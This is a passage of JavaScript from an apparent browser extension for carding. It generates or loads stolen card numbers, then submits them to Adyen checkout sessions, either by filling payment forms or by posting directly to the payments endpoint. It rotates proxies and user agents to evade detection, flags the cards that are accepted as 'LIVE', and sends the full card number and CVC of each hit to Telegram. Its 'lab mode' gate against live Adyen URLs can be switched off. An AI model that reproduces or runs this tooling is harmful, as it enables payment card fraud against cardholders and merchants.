    setTimeout(() => {
      panel.style.opacity = "1";
      panel.style.transform = "translateX(0)";
    }, 40);

    function minimize() {
      panel.style.transform = "translateX(40px)";
      panel.style.opacity = "0";
      setTimeout(() => {
        panel.style.display = "none";
        pill.style.display = "flex";
      }, 280);
    }

    function restore() {
      pill.style.display = "none";
      panel.style.display = "flex";
      requestAnimationFrame(() => {
        panel.style.opacity = "1";
        panel.style.transform = "translateX(0)";
      });
    }

    let dragY = 0;
    let dragging = false;
    pill.addEventListener("pointerdown", (e) => {
      dragging = true;
      dragY = e.clientY - pill.offsetTop;
      pill.setPointerCapture(e.pointerId);
    });
    pill.addEventListener("pointermove", (e) => {
      if (!dragging) return;
      const y = e.clientY - dragY;
      const maxY = window.innerHeight - 56;
      pill.style.top = Math.min(Math.max(8, y), maxY) + "px";
    });
    pill.addEventListener("pointerup", (e) => {
      dragging = false;
      if (pill.hasPointerCapture && pill.hasPointerCapture(e.pointerId)) pill.releasePointerCapture(e.pointerId);
    });
    pill.addEventListener("click", () => {
      if (dragging) return;
      restore();
    });

    const el = (id) => panel.querySelector(id);

    function savePanelState() {
      const cfg = {
        bin: el("#nono-bin").value.trim(),
        combo: el("#nono-combo").value.trim(),
        holder: el("#nono-holder").value.trim(),
        cardLength: parseInt(el("#nono-len").value, 10) || 16,
        autoSubmit: el("#nono-autosubmit").checked,
        autoOnLoad: el("#nono-autoonload").checked,
        enabled: true
      };
      setConfig(cfg);
      return cfg;
    }

    function logMsg(m) { log.textContent = m; }
    function updateCount() {
      count.textContent = "Live: " + liveHits + " / " + tries;
      pillCount.textContent = String(liveHits);
    }
    function logResult(icon, text, color, mono) {
      const line = document.createElement("div");
      line.style.cssText = "padding:3px 0;border-bottom:1px solid #141c26;color:" + (mono ? "#e6e6e6" : color) + ";white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:flex;gap:4px;align-items:center";
      line.innerHTML = '<span style="flex-shrink:0">' + icon + '</span><span style="overflow:hidden;text-overflow:ellipsis">' + text + '</span>';
      box.prepend(line);
      while (box.children.length > 12) box.lastChild.remove();
    }

    async function debugDump() {
      logMsg("Gathering frame inventory...");
      const tick = Date.now() + Math.floor(Math.random() * 1000);
      currentTick = tick;
      clearReports("nono_dbg");
      chrome.storage.local.set({ nono_dbg: { tick: tick } });
      await sleep(1400);
      const s = await summarize("nono_dbg");

      const iframes = Array.from(document.querySelectorAll("iframe")).map((f) => ({
        src: (f.src || "").slice(0, 130), title: f.title || "", w: f.offsetWidth, h: f.offsetHeight
      }));
      let out = "URL:" + location.href + " | iframes:" + iframes.length + " " + JSON.stringify(iframes) +
        " | inputs:" + document.querySelectorAll("input").length;
      s.texts.forEach((t, i) => { out += "\n---FRAME " + (i + 1) + "---" + t; });
      if (!s.texts.length) out += "\n(no frame handlers answered)";

      const line = document.createElement("div");
      line.style.cssText = "padding:3px 0;border-bottom:1px dashed #1a2430;color:#9be;font-size:10px;white-space:pre-wrap;word-break:break-all;max-height:250px;overflow:auto";
      line.textContent = out;
      box.prepend(line);
      logMsg("Debug dump ready. Read the top entry.");
    }

    el("#nono-min").addEventListener("click", minimize);
    el("#nono-dbg").addEventListener("click", debugDump);
    el("#nono-close").addEventListener("click", () => {
      panel.style.opacity = "0";
      setTimeout(() => panel.remove(), 200);
    });
    el("#nono-bin").addEventListener("input", savePanelState);
    el("#nono-combo").addEventListener("input", savePanelState);
    el("#nono-holder").addEventListener("input", savePanelState);
    el("#nono-len").addEventListener("change", savePanelState);
    el("#nono-autosubmit").addEventListener("change", savePanelState);
    el("#nono-autoonload").addEventListener("change", savePanelState);

    el("#nono-start").addEventListener("click", startHit);
    el("#nono-stop").addEventListener("click", () => {
      stopRequested = true;
      detachCapture();
      logMsg("Stopped by Chief.");
    });

    const proxyEl = (id) => panel.querySelector(id);
    if (proxyEl("#nono-proxy-next")) {
      proxyEl("#nono-proxy-next").addEventListener("click", async () => {
        const r = await proxyMsg({ action: "PROXY_ROTATE" });
        logMsg(r && r.proxy ? "Proxy -> " + r.proxy.label : "Proxy rotate failed.");
        refreshProxyStatus();
      });
      proxyEl("#nono-proxy-test").addEventListener("click", async () => {
        logMsg("Testing proxy...");
        const r = await proxyMsg({ action: "PROXY_TEST", index: 0 });
        logMsg(r && r.ok ? "Proxy OK " + r.ip + " (" + r.ms + "ms)" : "Proxy FAIL " + (r && r.error ? r.error : ""));
        refreshProxyStatus();
      });
      proxyEl("#nono-proxy-off").addEventListener("click", async () => {
        await proxyMsg({ action: "PROXY_OFF" });
        logMsg("Proxy off. System restored.");
        refreshProxyStatus();
      });
      refreshProxyStatus();
    }

    if (proxyEl("#nono-ua-next")) {
      let uaOn = false;
      proxyEl("#nono-ua-next").addEventListener("click", async () => {
        const r = await proxyMsg({ action: "UA_NEXT" });
        logMsg(r && r.ok ? "UA -> " + r.label : "UA rotate failed: " + (r && r.error));
        proxyEl("#nono-ua-label").textContent = "UA: " + (r && r.ok ? r.label : "OFF");
        uaOn = true;
        proxyEl("#nono-ua-toggle").style.background = "#22303a";
      });
      proxyEl("#nono-ua-toggle").addEventListener("click", async () => {
        uaOn = !uaOn;
        await proxyMsg({ action: "UA_SET_STATE", enabled: uaOn, index: 0 });
        proxyEl("#nono-ua-label").textContent = uaOn ? "UA: rotation ON" : "UA: OFF";
        proxyEl("#nono-ua-toggle").style.background = uaOn ? "#22303a" : "#3a3022";
        logMsg(uaOn ? "UA rotation enabled." : "UA rotation disabled.");
      });
    }

    const csStatus = proxyEl("#nono-cs-status");
    function csSet(status, color) {
      if (csStatus) {
        csStatus.textContent = status;
        csStatus.style.color = color || "#8fa3b5";
      }
    }

    async function runCheckshopperPay(sess, lab) {
      const gate = gateSessionUrl(sess.payUrl || sess.rawUrl || "", lab);
      if (!gate.ok) {
        csSet("REFUSED — " + gate.reason, "#ff5d5d");
        logMsg("Refused (live Adyen). Enable Lab mode for a live-looking sim, or use a sandbox URL, Chief.");
        return;
      }
      if (lab && /live|clientKey=live_/i.test(sess.payUrl || "")) {
        logMsg("Lab mode ON — hitting live-looking endpoint. Double-check it's your sim, Chief.");
      }
      if (!sess.payUrl) {
        csSet("no payments endpoint", "#ffd166");
        logMsg("Paste a checkoutshopper URL — no endpoint found in what you gave me.");
        return;
      }

      const cfg = await getConfig();
      const hasCard = (cfg && (cfg.combo || cfg.bin));
      if (!hasCard) {
        logMsg("Give me a BIN or combo first, Chief.");
        return;
      }

      stopRequested = false;
      tries = 0;
      liveHits = 0;
      updateCount();
      box.innerHTML = "";
      csSet("ARMed ✓ " + (sess.sessionId ? sess.sessionId.slice(0, 12) : "session"), "#00d1b2");
      logMsg("Checkoutshopper armed — pay loop starting...");
      await attachCapture();

      let sessionData = sess.sessionData;
      if (!sessionData && sess.sessionId) {
        const gs = await proxyMsg({ action: "GET_SESSION", sessionId: sess.sessionId, url: sess.payUrl });
        if (gs && gs.sessionData) {
          sessionData = gs.sessionData;
          logMsg("sessionData auto-loaded from captured request.");
        }
      }
      const browserInfo = sess.browserInfo || defaultBrowserInfo();

      while (!stopRequested) {
        const hitStart = Date.now();

        const pr = await proxyMsg({ action: "PROXY_BEFORE_HIT" });
        if (pr && pr.proxy) logMsg("Proxy: " + pr.proxy.label);

        const ua = await proxyMsg({ action: "UA_NEXT" });
        if (ua && ua.label) logMsg("UA: " + ua.label);

        let card;
        if (cfg && cfg.combo) {
          const p = parseCombo(cfg.combo);
          card = { number: p.number, month: p.month, year: p.year, cvc: p.cvc, holder: cfg.holder || "JOHN DOE" };
        } else if (window.CardGen && cfg && cfg.bin) {
          card = window.CardGen.genCard(cfg.bin.replace(/\s/g, ""), { length: cfg.cardLength || 16 });
          card.holder = cfg.holder || "JOHN DOE";
          card.month = card.expiryMonth;
          card.year = card.expiryYear;
        } else {
          logMsg("No usable card source — BIN or combo required.");
          return;
        }
        pendingCard = card;

        tries++;
        updateCount();
        logMsg("Try #" + tries + " -> " + card.number);

        const payload = {
          sessionData: sessionData || "",
          browserInfo: browserInfo,
          paymentMethod: {
            type: "scheme",
            number: card.number,
            expiryMonth: String(card.month || "12").padStart(2, "0"),
            expiryYear: "20" + String(card.year || "29").slice(-2),
            cvc: card.cvc || "",
            holderName: card.holder || "JOHN DOE"
          }
        };

        let bodyText = "";
        let status = 0;
        let err = "";
        try {
          const r = await fetch(sess.payUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Accept": "*/*",
              "Origin": location.origin,
              "Referer": location.href
            },
            body: JSON.stringify(payload)
          });
          status = r.status;
          bodyText = await r.text();
        } catch (e) {
          err = String((e && e.message) || e);
        }

        if (err) {
          logResult("&#9888;", "try#" + tries + " fetch failed: " + err.slice(0, 100), "#ffd166");
          if (/Mixed Content/i.test(err)) logMsg("Mixed-content — open the sandbox/sim page (http) and paste here.");
          await sleep(1200);
          continue;
        }

        capturedResps.push({ at: Date.now(), url: sess.payUrl, status: status, body: bodyText });
        if (capturedResps.length > 60) capturedResps.shift();

        const info = parseAdyenResp(bodyText);
        let res = info
          ? {
              ok: /authorised|pending|challenge|redirect|threeds|await|otp/i.test(info.resultCode || ""),
              label: "API " + (info.resultCode || info.action || "?") +
                (info.refusalReason ? " | " + info.refusalReason : "")
            }
          : { ok: false, label: "NO ADYEN VERDICT (HTTP " + status + ")" };

        if (info) {
          window.__nonoResult && window.__nonoResult("&#128269;",
            "RESP " + (info.resultCode || info.action || "?") +
            (info.refusalReason ? " | " + info.refusalReason : ""), "#c9b8ff");
        }

        if (res.ok) {
          liveHits++;
          updateCount();
          window.__nonoResult && window.__nonoResult("&#11088;",
            "LIVE #" + liveHits + "  " + card.number + " " + card.month + "/" + card.year.slice(-2) +
            " " + card.cvc + " -> " + res.label, "#00d1b2");
          logMsg("LIVE HIT! " + res.label + ". Stopping.");
          stopRequested = true;

          const prLabel = pr && pr.proxy && pr.proxy.label ? pr.proxy.label : "";
          const uaLabel = ua && ua.label ? ua.label : "";
          const hitText = [
            "<b>⚡ HIT #" + liveHits + "</b>",
            "Card: <code>" + card.number + "</code> " + (card.month || "") + "/" + (card.year || "").slice(-2) + " cvc <code>" + card.cvc + "</code>",
            "Verdict: <b>" + res.label + "</b>",
            "Session: " + (sess.sessionId || "?") + " | " + sess.payUrl.split("//")[1].split("/")[0],
            prLabel ? "Proxy: " + prLabel : "",
            uaLabel ? "UA: " + uaLabel : ""
          ].filter(Boolean).join("\n");
          proxyMsg({ action: "TG_HIT", text: hitText }).then((tg) => {
            if (!tg) return;
            if (tg.gated) {
              window.__nonoLog && window.__nonoLog("Telegram blocked: " + (tg.reason || "gated"));
            } else if (!tg.ok) {
              window.__nonoLog && window.__nonoLog("Telegram error: " + (tg.error || "?"));
            }
          });
        } else {
          window.__nonoResult && window.__nonoResult("&#10060;",
            "try#" + tries + " " + card.number + " " + card.month + "/" + card.year.slice(-2) +
            " " + card.cvc + " -> " + res.label, "#ff5d5d");
          if (tries >= 30) {
            logMsg("30 tries. Stopping.");
            stopRequested = true;
          }
          await sleep(1200);
        }
      }

      csSet("done — " + liveHits + " hit(s)", liveHits ? "#00d1b2" : "#8fa3b5");
      logMsg("Pay loop stopped.");
    }

    if (proxyEl("#nono-cs-pay")) {
      proxyEl("#nono-cs-pay").addEventListener("click", async () => {
        const txt = proxyEl("#nono-cs-url").value;
        const lab = await getLab();
        const rawList = (txt.match(/https?:\/\/[^\s'"\)]+/g) || []);
        const warned = gateSessionUrl(txt, lab);
        if (!warned.ok) {
          csSet("REFUSED — " + warned.reason, "#ff5d5d");
          logMsg("Refused (live Adyen). Enable Lab mode for a live-looking sim, Chief.");
          return;
        }
        for (const ru of rawList) {
          const gg = gateSessionUrl(ru, lab);
          if (!gg.ok) {
            csSet("REFUSED — " + gg.reason, "#ff5d5d");
            logMsg("Refused (live Adyen). Enable Lab mode for a live-looking sim, Chief.");
            return;
          }
        }
        const sess = parseCheckshopper(txt);
        if (!sess) {
          csSet("couldn't parse", "#ffd166");
          logMsg("Couldn't parse that — paste a checkoutshopper URL or the full curl, Chief.");
          return;
        }
        sess.rawUrl = txt;
        if (lab) {
          csSet("LAB — allowed", "#ffd166");
          logMsg("Lab mode ON — live-looking URL allowed for your sim.");
        }
        logMsg("Session parsed: " + (sess.sessionId || sess.payUrl || "?"));
        runCheckshopperPay(sess, lab);
      });
    }

    function startHit() {
      getLab().then((lab) => {
        if (!hostAllowed(location.href, lab)) {
          logMsg("Blocked — page not allowlisted. Enable Lab mode in Options for your sim.");
          return;
        }
        const bin = el("#nono-bin").value.trim();
        const combo = el("#nono-combo").value.trim();
        if (!bin && !combo) {
          logMsg("Give me a BIN or combo first, Chief.");
          return;
        }
        savePanelState();
        injectHook();
        attachCapture();
        stopRequested = false;
        tries = 0;
        liveHits = 0;
        updateCount();
        box.innerHTML = "";
        logMsg("Hitting...");
        runHits();
      });
    }

    window.__nonoLog = logMsg;
    window.__nonoUpdate = updateCount;
    window.__nonoResult = logResult;
    window.__nonoRestore = restore;
  }

  function parseCombo(combo) {
    const parts = combo.split("|").map((s) => s.trim());
    return { number: (parts[0] || "").replace(/\s/g, ""), month: parts[1] || "", year: parts[2] || "", cvc: parts[3] || "" };
  }

  async function fillRound(card) {
    let got = { any: false, fields: {} };
    try {
      const res = await execFill(card);
      if (res && !res.error && res.any) got = { any: true, fields: res.fields || {} };
    } catch (e) {}
    const tick = Date.now() + Math.floor(Math.random() * 1000);
    currentTick = tick;
    clearReports("nono_ff");
    chrome.storage.local.set({ nono_ff: { card: card, tick: tick } });
    const st = await waitReports("nono_ff", 1500, 6000);
    return { exec: got, storage: st, any: got.any || st.any };
  }

  async function runHits() {
    const cfg = await getConfig();
    if (!cfg) return;
    running = true;
    injectHook();
    window.__nonoLog && window.__nonoLog("Running...");

    while (!stopRequested && running) {
      const hitStart = Date.now();

      const pr = await proxyMsg({ action: "PROXY_BEFORE_HIT" });
      if (pr && pr.proxy) {
        window.__nonoLog && window.__nonoLog("Proxy: " + pr.proxy.label);
      }

      const ua = await proxyMsg({ action: "UA_NEXT" });
      if (ua && ua.label) {
        window.__nonoLog && window.__nonoLog("UA: " + ua.label);
      }

      let card;
      if (cfg.combo) {
        const p = parseCombo(cfg.combo);
        card = { number: p.number, month: p.month, year: p.year, cvc: p.cvc, holder: cfg.holder || "JOHN DOE" };
      } else {
        card = window.CardGen.genCard(cfg.bin.replace(/\s/g, ""), { length: cfg.cardLength || 16 });
        card.holder = cfg.holder || "JOHN DOE";
        card.month = card.expiryMonth;
        card.year = card.expiryYear;
      }
      pendingCard = card;

      tries++;
      window.__nonoUpdate && window.__nonoUpdate();
      window.__nonoLog && window.__nonoLog("Try #" + tries + " -> " + card.number);

      let st = { any: false };
      for (let round = 0; round < 3 && !stopRequested; round++) {
        ensureCardMethod();
        await sleep(500);
        st = await fillRound(card);
        if (st.any) break;
        window.__nonoLog && window.__nonoLog("No fields yet, round " + (round + 1) + "/3...");
        await sleep(2200);
      }

      let submitted = false;
      if (cfg.autoSubmit && st.any) {
        submitted = await tryPayHard(card);
        if (!submitted) {
          window.__nonoLog && window.__nonoLog("Pay still dead, re-fill + hard pay round 2...");
          st = await fillRound(card);
          await sleep(900);
          submitted = await tryPayHard(card);
        }
        await sleep(1800);
      }

      const resp = lastRespSince(hitStart);
      let respInfo = resp ? parseAdyenResp(resp.body) : null;

      const dtTick = Date.now() + Math.floor(Math.random() * 1000);
      currentTick = dtTick;
      clearReports("nono_dt");
      chrome.storage.local.set({ nono_detect: { tick: dtTick } });
      const dt = await waitReports("nono_dt", 800, 4000);

      let res = detectResult(dt.texts);
      if (respInfo) {
        const code = (respInfo.resultCode || respInfo.action || "").toLowerCase();
        const isGood = /authorised|pending|redirectshopper|challenge|threeds|: challenge|otp|await/.test(code);
        res = {
          ok: isGood,
          label: "API " + (respInfo.resultCode || respInfo.action || "?") +
            (respInfo.refusalReason ? " | " + respInfo.refusalReason : "")
        };
      }
      if (!res) {
        if (!st.any) res = { ok: false, label: "FIELDS NOT FOUND" };
        else if (!submitted) res = { ok: false, label: "PAY BUTTON MISSED" };
        else res = { ok: false, label: "NO VISIBLE RESULT" };
      }

      window.__nonoUpdate && window.__nonoUpdate();

      const respTail = respInfo
        ? " | " + (respInfo.resultCode || respInfo.action || "")
        + (respInfo.refusalReason ? " " + respInfo.refusalReason : "")
        : "";

      if (res.ok) {
        liveHits++;
        window.__nonoUpdate && window.__nonoUpdate();
        window.__nonoResult && window.__nonoResult("&#11088;",
          "LIVE #" + liveHits + "  " + card.number + " " + card.month + "/" + card.year.slice(-2) +
          " " + card.cvc + " -> " + res.label, "#00d1b2");
        window.__nonoLog && window.__nonoLog("LIVE HIT! " + res.label + ". Stopping.");
        stopRequested = true;

        const prLabel = pr && pr.proxy && pr.proxy.label ? pr.proxy.label : "";
        const uaLabel = ua && ua.label ? ua.label : "";
        const hitText = [
          "<b>⚡ HIT #" + liveHits + "</b>",
          "Card: <code>" + card.number + "</code> " + (card.month || "") + "/" + (card.year || "").slice(-2) + " cvc <code>" + card.cvc + "</code>",
          "Verdict: <b>" + res.label + "</b>" + respTail,
          prLabel ? "Proxy: " + prLabel : "",
          uaLabel ? "UA: " + uaLabel : ""
        ].filter(Boolean).join("\n");
        proxyMsg({ action: "TG_HIT", text: hitText }).then((tg) => {
          if (!tg) return;
          if (tg.gated) {
            window.__nonoLog && window.__nonoLog("Telegram blocked: " + (tg.reason || "gated"));
          } else if (!tg.ok) {
            window.__nonoLog && window.__nonoLog("Telegram error: " + (tg.error || "?"));
          }
        });
      } else {
        window.__nonoResult && window.__nonoResult("&#10060;",
          "try#" + tries + " " + card.number + " " + card.month + "/" + card.year.slice(-2) +
          " " + card.cvc + " -> " + res.label + respTail, "#ff5d5d");
        if (tries >= 30) {
          window.__nonoLog && window.__nonoLog("30 dead tries. Stopping.");
          stopRequested = true;
        }
      }

      await sleep(cfg.autoSubmit ? 2000 : 800);
    }

    running = false;
    window.__nonoLog && window.__nonoLog("Cycle stopped.");
  }

  function reevaluate() {
    getLab().then((lab) => {
      if (!isTop) return;
      const allowed = hostAllowed(location.href, lab);
      const panel = document.getElementById("nono-panel");
      const blocked = document.getElementById("nono-blocked");
      if (allowed) {
        removeBlockedNotice();
        if (!panel) init();
      } else {
        if (panel) {
          panel.remove();
          stopRequested = true;
        }
        if (looksAdyenish(location.href)) buildBlockedNotice();
      }
    });
  }

  async function init() {
    if (!isTop) return;
    const lab = await getLab();
    if (!hostAllowed(location.href, lab)) {
      if (looksAdyenish(location.href)) buildBlockedNotice();
      return;
    }
    removeBlockedNotice();
    buildPanel();
    const cfg = await getConfig();
    if (cfg) {
      const ids = ["nono-bin", "nono-combo", "nono-holder", "nono-len", "nono-autosubmit", "nono-autoonload"];
      const vals = [cfg.bin || "", cfg.combo || "", cfg.holder || "", String(cfg.cardLength || 16), !!cfg.autoSubmit, !!cfg.autoOnLoad];
      ids.forEach((id, i) => {
        const e = document.getElementById(id);
        if (e) {
          if (e.type === "checkbox") e.checked = vals[i];
          else e.value = vals[i];
        }
      });
      if (cfg.enabled && cfg.autoOnLoad) {
        setTimeout(() => {
          const b = document.getElementById("nono-start");
          if (b) b.click();
        }, 1800);
      }
    }
  }

  setTimeout(init, 700);
})();